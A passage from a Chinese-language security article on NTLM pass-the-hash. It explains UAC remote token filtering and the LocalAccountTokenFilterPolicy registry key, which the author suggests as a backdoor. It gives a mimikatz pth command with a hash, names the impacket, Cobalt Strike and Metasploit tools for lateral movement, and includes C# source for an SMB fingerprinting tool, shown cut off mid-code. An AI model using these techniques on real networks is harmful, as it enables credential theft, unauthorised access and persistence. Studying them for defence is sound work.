<p>发现ntlm认证通过之后，对ADMIN$没有写入权限。那么是什么阻止了我们对本地管理员组的非RID500帐户使用哈希传递？为什么RID 500帐户具有特殊情况？除此之外，为什么本地管理员成员的域帐户也可以免除这种阻止行为。(事实上，之前在winrm进行远程登录的时候我也遇到相关的问题，winrm远程登录只能使用RID 500帐户与本地管理员成员的域用户登录，不能使用本地管理员组的非RID500账户)</p>
<p>所有这些问题的真正罪魁祸首是远程访问上下文中的用户帐户控制（UAC）令牌筛选。</p>
<p>对于远程连接到Windows Vista +计算机的任何非RID 500本地管理员帐户，无论是通过WMI，PSEXEC还是其他方法(有个例外，那就是通过RDP远程)，即使用户是本地管理员，返回的令牌都是已过滤的管理员令牌。</p>
<p>已过滤的管理员令牌有如下特征(深入解析Windows操作系统第六版P501)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0188dd5b8aa3cf5882.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015632611ec4d6c090.png"></p>
<p>通俗点来说就是管理员组的非RID500账户登录之后是没有过UAC的，所有特权都被移除，除了上图的Change Notify之类的。而RID500账户登录之后也以完全管理特权（”完全令牌模式”）运行所有应用程序，实际是不用过UAC的，这个可以自己测试下。</p>
<p>对于本地“管理员”组中的域用户帐户，文档指出：</p>
<blockquote>
<p>当具有域用户帐户的用户远程登录Windows Vista计算机并且该用户是Administrators组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的UAC被禁用在该会话的远程计算机上</p>
</blockquote>
<p>如果<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code>项存在(默认不存在)且配置为1，将授予来自管理员所有本地成员的远程连接完整的高完整性令牌。这意味着未过滤非RID 500帐户连接，并且可以成功传递哈希值！</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f560c775672372a.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ed703606a3d87b00.png"></p>
<p>默认情况下这个注册表项是不存在的，我们可以用以留作后门，但是有意思的是，我们之前提过一嘴的，在配置winrm的时候，也会遇到同样的问题，本地管理员组的非RID500账户不能登录，于是有些运维在搜寻了一堆文章后，开启该注册表项是最快捷有效的问题:)。</p>
<ol start="2">
<li>进行pth 的一些常用工具</li>
</ol>
<p>一般有两种场景底下需要用到pth，第一种是我们已知目标计算机的IP,用户名，hash尝试登陆目标主机。</p>
<p>另外一种场景就是我们在一个大型的内网环境底下获得一个用户的hash，尝试去撞整个内网的相同密码的主机，从而进行横向移动。下面列举部分pth的工具。</p>
<ul>
<li>mimikatz</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege：：debug</span><br><span class="line">sekurlsa::pth /user:win10 /domain:test.local /ntlm:<span class="number">6</span>a6293bc0c56d7b9731e2d5506065e4a</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d3f24855cbeb8b4d.png"></p>
<p>接下来就可以使用psecex,wmic,at之类的进行远程命令执行。</p>
<ul>
<li>impacket</li>
</ul>
<p>impacket底下执行远程命令执行的脚本有5个</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">psexec.py</span><br><span class="line">smbexec.py</span><br><span class="line">atexec.py</span><br><span class="line">wmiexec.py</span><br><span class="line">dcomexec.py</span><br></pre></td></tr></table></figure>

<p>都支持使用hash进行远程命令执行，通过–hashes指定hash,以psexec.py为例</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015f7186cbd504480c.png"></p>
<ul>
<li>cobalstrike</li>
</ul>
<p>cabalstrike支持批量得进行pth，在横向移动中撞密码hash中特别有效</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bb2d9b4e787eb560.png"></p>
<ul>
<li>msf</li>
</ul>
<p>msf的exploit&#x2F;windows&#x2F;smb&#x2F;psexec_psh模块是支持对一个网段进行pth的，在横向移动中撞密码hash中特别有效</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016cda2ad2b2312ccb.png"></p>
<h4 id="利用ntlm进行的信息收集"><a href="#利用ntlm进行的信息收集" class="headerlink" title="利用ntlm进行的信息收集"></a>利用ntlm进行的信息收集</h4><p>回顾type2 。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017f0ae4b36b11e5ae.png"></p>
<p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行ntlm 交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。前面我们说过ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等。我们以SMB为例。在目标主机开放了445或者139的情况，通过给服务器发送一个type1的请求，然后解析type2的响应。就可以收集到一些信息。</p>
<p>直接上代码(代码来源<a target="_blank" rel="noopener" href="https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html">c#版本的smb_version</a>)，大家也可以仿造代码的形式，自己实现其他上层协议下的信息收集。</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Zcg.Tests</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">smbver</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] d1 =&#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x85</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x4D</span>, <span class="number">0x42</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x53</span>, <span class="number">0xC8</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x20</span>, <span class="number">0x4E</span>, <span class="number">0x45</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x4F</span>, </span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x4B</span>, <span class="number">0x20</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x31</span>, <span class="number">0x2E</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, </span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x31</span>, <span class="number">0x2E</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, </span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x70</span>, </span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x33</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x31</span>, <span class="number">0x2E</span>, <span class="number">0x32</span>, <span class="number">0x58</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, </span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x32</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, </span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] d2 =&#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x4D</span>, <span class="number">0x42</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x07</span>, <span class="number">0xC8</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA0</span>, <span class="number">0xCF</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, </span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0xA0</span>, <span class="number">0x3E</span>, <span class="number">0x30</span>, <span class="number">0x3C</span>, <span class="number">0xA0</span>, <span class="number">0x0E</span>, <span class="number">0x30</span>, </span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0x06</span>, <span class="number">0x0A</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x82</span>, <span class="number">0x37</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0xA2</span>, <span class="number">0x2A</span>, <span class="number">0x04</span>, </span><br><span class="line">    <span class="number">0x28</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x82</span>, <span class="number">0x08</span>, </span><br><span class="line">    <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0xCE</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x35</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">byte</span>[] d3=&#123;</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x4b</span>,<span class="number">0x46</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x45</span>,<span class="number">0x43</span>,<span class="number">0x46</span>,<span class="number">0x44</span>,<span class="number">0x45</span></span><br><span class="line">,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span></span><br><span class="line">,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span></span><br><span class="line">,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span></span><br><span class="line">,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;SMB Version Detection tool 0.1&quot;</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Part of GMH&#x27;s fuck Tools, Code By zcgonvh.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (args.Length &lt; <span class="number">1</span>) &#123; Console.WriteLine(<span class="string">&quot;usage: smbver host [port]&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">            <span class="built_in">string</span> host = args[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">int</span> port = <span class="number">445</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123; port = <span class="built_in">int</span>.Parse(args[<span class="number">1</span>]); &#125;</span><br><span class="line">            <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] buf = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                Socket sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.Connect(host, port);</span><br><span class="line">                <span class="keyword">if</span>(port==<span class="number">139</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  sock.Send(d3);</span><br><span class="line">                  sock.Receive(buf);</span><br><span class="line">                &#125;</span><br><span class="line">                sock.Send(d1);</span><br><span class="line">                sock.Receive(buf);</span><br><span class="line">                sock.Send(d2);</span><br><span class="line">                sock.Receive(buf);</span><br><span class="line">                <span class="built_in">int</span> len = BitConverter.ToInt16(buf, <span class="number">43</span>);</span><br><span class="line">                <span class="built_in">string</span>[] ss = Encoding.Unicode.GetString(buf, len + <span class="number">47</span>, buf.Length - len - <span class="number">47</span>).Split(<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;native os: &quot;</span> + ss[<span class="number">0</span>]);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;native lan manager: &quot;</span> + ss[<span class="number">1</span>]);</span><br><span class="line">                <span class="built_in">int</span> off = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">47</span>; i &lt; len - <span class="number">7</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (buf[i] == <span class="string">&#x27;N&#x27;</span> &amp;&amp; buf[i + <span class="number">1</span>] == <span class="string">&#x27;T&#x27;</span> &amp;&amp; buf[i + <span class="number">2</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; buf[i + <span class="number">3</span>] == <span class="string">&#x27;M&#x27;</span> &amp;&amp; buf[i + <span class="number">4</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; buf[i + <span class="number">5</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; buf[i + <span class="number">6</span>] == <span class="string">&#x27;P&#x27;</span>) &#123; off = i; <span class="keyword">break</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">byte</span>[] ntlm = <span class="keyword">new</span> <span class="built_in">byte</span>[len];</span><br><span class="line">                Array.Copy(buf, off, ntlm, <span class="number">0</span>, len);</span><br><span class="line">                len = BitConverter.ToInt16(ntlm, <span class="number">0xc</span>);</span><br><span class="line">                off = BitConverter.ToInt16(ntlm, <span class="number">0x10</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;negotiate target: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;os major version: &quot;</span> + ntlm[off - <span class="number">8</span>]);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;os minor version: &quot;</span> + ntlm[off - <span class="number">7</span>]);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;os build number: &quot;</span> + BitConverter.ToInt16(ntlm, off - <span class="number">6</span>));</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;ntlm current revision: &quot;</span> + ntlm[off - <span class="number">1</span>]);</span><br><span class="line">                off += len;</span><br><span class="line">                <span class="built_in">int</span> type = BitConverter.ToInt16(ntlm, off);</span><br><span class="line">                <span class="keyword">while</span> (type != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    off += <span class="number">2</span>;</span><br><span class="line">                    len = BitConverter.ToInt16(ntlm, off);</span><br><span class="line">                    off += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">switch</span> (type)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;NetBIOS computer name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;NetBIOS domain name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;DNS computer name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;DNS domain name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span 